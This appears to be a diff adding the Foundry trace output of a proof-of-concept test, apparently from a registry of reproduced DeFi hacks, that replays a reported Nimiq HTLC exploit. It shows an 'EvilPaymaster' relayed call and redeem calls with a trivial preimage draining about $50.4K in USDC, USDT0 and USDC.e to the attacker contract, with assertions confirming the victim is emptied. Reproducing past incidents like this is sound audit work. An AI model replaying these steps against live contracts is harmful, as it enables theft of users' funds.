+    │   │   ├─ [188531] 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f::execute((0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 0, 300000 [3e5], 1, 0x3878a2a3e0dc09c975ac4802a8b4e4f1dc8d0f59b2992d20f4b382eca66f2dbda05afbaa0000000000000000000000002791bca1f2de4661ed88a30c99a7a9449aa8417400000000000000000000000000000000000000000000000000000000000a167d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9ec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5000000000000000000000000000000000000000000000000000000006aac77380000000000000000000000000000000000000000000000000000000000000000, 0), 0x7cc73c89733fcd75cc389c753804684f4fc1b2e5143f933b5a7537b862b501e0, 0x978a803d8b468b1838de23314397ae22a6f146d16cb2a446f053ae0f07a657c4, 0x1e6972e5e3a5892be45565d3d78b1982044e09eb0cc034c4b2f5c723e6732673, 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   ├─ [24209] 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174::transferFrom(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 661117 [6.611e5])
+    │   │   │   │   ├─ [23531] 0xDD9185DB084f5C4fFf3b4f70E7bA62123b812226::transferFrom(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 661117 [6.611e5]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, to: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, amount: 661117 [6.611e5])
+    │   │   │   │   │   ├─ emit Approval(owner: 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773, spender: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, amount: 115792089237316195423570985008687907853269984665640564039457584007745969807966 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xc206f92cb086e5e1fdd99b03357c111499e4ddad2e5e8f3d9e74e67c6cc137a3: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffd9148978db → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffd9147f625e
+    │   │   │   │   │   │   @ 0xb341e06a42b20fb16f8796f6066cd9692317842ec2ef80f4f81bf92fc980d946: 661117 → 0
+    │   │   │   │   │   │   @ 0xe27aab77bc59f46287a8ad98bb3b27f20a71cf22300a2e643daf0430af5dbef4: 0x0000000000000000000000000000000000000000000000000000000001147060 → 0x00000000000000000000000000000000000000000000000000000000011e86dd
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13049: 0 → 0x000000000000000000000000000000000000000000000000000000006aac7738
+    │   │   │   │   @ 0x01607be062344ec22942fe3af72a5002064e2ceb4f05cd2fb8284135c351d447: 1 → 2
+    │   │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13048: 0 → 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5
+    │   │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13045: 0 → 661117
+    │   │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13044: 0 → 0x0000000000000000000000002791bca1f2de4661ed88a30c99a7a9449aa84174
+    │   │   │   │   @ 0xb28129437c776b2baf9d2a7d61c7f5440459fc7df105373e5c0b78abfdd01989: 0 → 661117
+    │   │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13046: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13047: 0 → 0x0000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [954] EvilPaymaster::postRelayedCall(0x, true, 298729 [2.987e5], RelayData({ gasPrice: 0, pctRelayFee: 0, baseRelayFee: 0, relayWorker: 0x96a1e3dB49497da5Ce2dfA87c9575018dAafB1E2, paymaster: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, forwarder: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, paymasterData: 0x, clientId: 0 }))
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000
+    │   ├─  emit topic 0: 0xc9aa709786a3d5fe2cc947abc1ba8cbb0f6decb57aa74b84eb7f558125fee454
+    │   │        topic 1: 0x000000000000000000000000f8559728825f775be396d8d9dc9ef687bb4299a0
+    │   │        topic 2: 0x00000000000000000000000096a1e3db49497da5ce2dfa87c9575018daafb1e2
+    │   │        topic 3: 0x00000000000000000000000024cb173ae221aea93369f34bdcf0ddb35b436773
+    │   │           data: 0x000000000000000000000000f615bd7ea00c4cc7f39faad0895db5f40891359f0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f3878a2a30000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] true, 0x
+    ├─ [0] VM::assertTrue(true, "paymaster rejected relayCall") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1222] 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174::balanceOf(0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f) [staticcall]
+    │   ├─ [557] 0xDD9185DB084f5C4fFf3b4f70E7bA62123b812226::balanceOf(0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f) [delegatecall]
+    │   │   └─ ← [Return] 18777821 [1.877e7]
+    │   └─ ← [Return] 18777821 [1.877e7]
+    ├─ [0] VM::assertEq(1, 1, "handler did not receive tokens") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [staticcall]
+    │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "USDC not fully drained from victim") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1389] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [staticcall]
+    │   ├─ [535] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "USDT0 not fully drained from victim") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1222] 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [staticcall]
+    │   ├─ [557] 0xDD9185DB084f5C4fFf3b4f70E7bA62123b812226::balanceOf(0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "USDC.e not fully drained from victim") [staticcall]
+    │   └─ ← [Return]
+    ├─ [131775] → new HTLCRecipient@0x8c71BaAC29a541a0E76AcEfe4029fbE7483c90E9
+    │   └─ ← [Return] 658 bytes of code
+    ├─ [0] VM::assertEq(HTLCRecipient: [0x8c71BaAC29a541a0E76AcEfe4029fbE7483c90E9], HTLCRecipient: [0x8c71BaAC29a541a0E76AcEfe4029fbE7483c90E9], "CREATE2 address mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ [36105] HTLCRecipient::redeemTo(0x0cFD862bE942846Cebad797d7c1BC6e47714959b, 0xfbd921fab1906cefa35cd0062d2124d1605cadc3a7288f8ff7c4a8a80cc05269, NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   ├─ [34152] 0x0cFD862bE942846Cebad797d7c1BC6e47714959b::redeem(0xfbd921fab1906cefa35cd0062d2124d1605cadc3a7288f8ff7c4a8a80cc05269, NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000000001, 0)
+    │   │   ├─ [72] PRECOMPILES::sha256(0x0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
+    │   │   │   └─ ← [Return] 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5
+    │   │   ├─ [27263] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::transfer(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26130641710 [2.613e10])
+    │   │   │   ├─ [26563] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::transfer(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26130641710 [2.613e10]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0x0cFD862bE942846Cebad797d7c1BC6e47714959b, to: NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 26130641710 [2.613e10])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xf4b519c8c69b2f0e3605044a0f58e3c926cf181fc810e8999d4949e83b0b2c4c: 0x000000000000000000000000000000000000000000000000000000061672e9fb → 0x0000000000000000000000000000000000000000000000000000000000f0f6cd
+    │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x000000000000000000000000000000000000000000000000000000061581f32e
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  emit topic 0: 0xfe5d8239fb4c0cba42eacd5004db0b95a5a23da7b699c7eedf948a398bbe2e85
+    │   │   │        topic 1: 0xfbd921fab1906cefa35cd0062d2124d1605cadc3a7288f8ff7c4a8a80cc05269
+    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718ec: 0x000000000000000000000000000000000000000000000000000000006aac7738 → 0
+    │   │   │   @ 0x58e6b5fe9e5523c78e256f296dfa37167d4a2ed27bc6d9ed700806fb27603056: 0x0000000000000000000000000000000000000000000000000000000615c73df9 → 0x0000000000000000000000000000000000000000000000000000000000454acb
+    │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718e7: 0x0000000000000000000000003c499c542cef5e3811e1192ce70d8cc03d5c3359 → 0
+    │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718eb: 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5 → 0
+    │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718ea: 0x0000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9 → 0
+    │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718e8: 0x000000000000000000000000000000000000000000000000000000061581f32e → 0
+    │   │   │   @ 0x2904274e912f135c6cd9720673dbe6bcdbba18157f660d5bc19b16ed418718e9: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [35320] HTLCRecipient::redeemTo(0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 0x50e008344be186271dc7f86ca2369ceaa523d8f8f485303ffa0d7dd5b28e05a8, NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   ├─ [33367] 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f::redeem(0x50e008344be186271dc7f86ca2369ceaa523d8f8f485303ffa0d7dd5b28e05a8, NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000000001, 0)
+    │   │   ├─ [72] PRECOMPILES::sha256(0x0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
+    │   │   │   └─ ← [Return] 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5
+    │   │   ├─ [26500] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::transfer(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24332489269 [2.433e10])
+    │   │   │   ├─ [25640] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::transfer(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24332489269 [2.433e10]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, to: NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 24332489269 [2.433e10])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000000000000000000000005aa545235
+    │   │   │   │   │   @ 0xe27aab77bc59f46287a8ad98bb3b27f20a71cf22300a2e643daf0430af5dbef4: 0x00000000000000000000000000000000000000000000000000000005ac1cae96 → 0x0000000000000000000000000000000000000000000000000000000001c85c61
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  emit topic 0: 0xfe5d8239fb4c0cba42eacd5004db0b95a5a23da7b699c7eedf948a398bbe2e85
+    │   │   │        topic 1: 0x50e008344be186271dc7f86ca2369ceaa523d8f8f485303ffa0d7dd5b28e05a8
+    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c6: 0x000000000000000000000000000000000000000000000000000000006aac7738 → 0
+    │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c3: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c4: 0x0000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9 → 0
+    │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c1: 0x000000000000000000000000c2132d05d31c914a87c6611c10748aeb04b58e8f → 0
+    │   │   │   @ 0x235ddf7029c7c86d64975af0151ddd705dd247b624dbda580df399796cd6cbe4: 0x00000000000000000000000000000000000000000000000000000005abfc3bc1 → 0x0000000000000000000000000000000000000000000000000000000001a7e98c
+    │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c5: 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5 → 0
+    │   │   │   @ 0x6f1971079ffa933eae424f94365cbe4c36f4ec0d92d0c7613ab76ddf1dada5c2: 0x00000000000000000000000000000000000000000000000000000005aa545235 → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [37464] HTLCRecipient::redeemTo(0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, 0xe0dc09c975ac4802a8b4e4f1dc8d0f59b2992d20f4b382eca66f2dbda05afbaa, NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   ├─ [35511] 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f::redeem(0xe0dc09c975ac4802a8b4e4f1dc8d0f59b2992d20f4b382eca66f2dbda05afbaa, NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000000001, 0)
+    │   │   ├─ [72] PRECOMPILES::sha256(0x0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
+    │   │   │   └─ ← [Return] 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5
+    │   │   ├─ [28644] 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174::transfer(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 661117 [6.611e5])
+    │   │   │   ├─ [27973] 0xDD9185DB084f5C4fFf3b4f70E7bA62123b812226::transfer(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 661117 [6.611e5]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f, to: NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 661117 [6.611e5])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xe27aab77bc59f46287a8ad98bb3b27f20a71cf22300a2e643daf0430af5dbef4: 0x00000000000000000000000000000000000000000000000000000000011e86dd → 0x0000000000000000000000000000000000000000000000000000000001147060
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 661117
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  emit topic 0: 0xfe5d8239fb4c0cba42eacd5004db0b95a5a23da7b699c7eedf948a398bbe2e85
+    │   │   │        topic 1: 0xe0dc09c975ac4802a8b4e4f1dc8d0f59b2992d20f4b382eca66f2dbda05afbaa
+    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13046: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13048: 0xec4916dd28fc4c10d78e287ca5d9cc51ee1ae73cbfde08c6b37324cbfaac8bc5 → 0
+    │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13045: 661117 → 0
+    │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13044: 0x0000000000000000000000002791bca1f2de4661ed88a30c99a7a9449aa84174 → 0
+    │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13047: 0x0000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9 → 0
+    │   │   │   @ 0xf0fff824b687d00dc1e15a6e418980c3ea71368c122d9551654f19eb60a13049: 0x000000000000000000000000000000000000000000000000000000006aac7738 → 0
+    │   │   │   @ 0xb28129437c776b2baf9d2a7d61c7f5440459fc7df105373e5c0b78abfdd01989: 661117 → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 26130641710 [2.613e10]
+    │   └─ ← [Return] 26130641710 [2.613e10]
+    ├─ [1389] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [535] 0x90040487A6C9F949C4F07CaDCFB0f3B8EEAb4229::balanceOf(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 24332489269 [2.433e10]
+    │   └─ ← [Return] 24332489269 [2.433e10]
+    ├─ [1222] 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174::balanceOf(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [557] 0xDD9185DB084f5C4fFf3b4f70E7bA62123b812226::balanceOf(NimiqExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 661117 [6.611e5]
+    │   └─ ← [Return] 661117 [6.611e5]
+    ├─ emit log_named_decimal_uint(key: "attacker USDC   after", val: 26130641710 [2.613e10], decimals: 6)
+    ├─ emit log_named_decimal_uint(key: "attacker USDT0  after", val: 24332489269 [2.433e10], decimals: 6)
+    ├─ emit log_named_decimal_uint(key: "attacker USDC.e after", val: 661117 [6.611e5], decimals: 6)
+    ├─ [0] VM::assertEq(26130641710 [2.613e10], 26130641710 [2.613e10], "USDC profit mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(24332489269 [2.433e10], 24332489269 [2.433e10], "USDT0 profit mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(661117 [6.611e5], 661117 [6.611e5], "USDC.e profit mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "total drained (USD)", val: 50463792096 [5.046e10], decimals: 6)
+    ├─ [0] VM::assertApproxEqAbs(50463792096 [5.046e10], 50463000000 [5.046e10], 5000000 [5e6], "total loss far from reported ~$50.4K") [staticcall]
+    │   └─ ← [Return]
+    ├─  storage changes:
+    │   @ 35: 0 → 0x0000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9
+    │   @ 38: 0 → 661117
+    │   @ 34: 0 → 0x0000000000000000000000008c71baac29a541a0e76acefe4029fbe7483c90e9
+    │   @ 36: 0 → 0x000000000000000000000000000000000000000000000000000000061581f32e
+    │   @ 37: 0 → 0x00000000000000000000000000000000000000000000000000000005aa545235
+    │   @ 33: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 29.60ms (18.93ms CPU time)
+
+Ran 1 test suite in 544.10ms (29.60ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/Users/alex/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71: 18615 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /Users/alex/RustroverProjects/audits/evm-hack-registry/2026-09-Nimiq_exp)
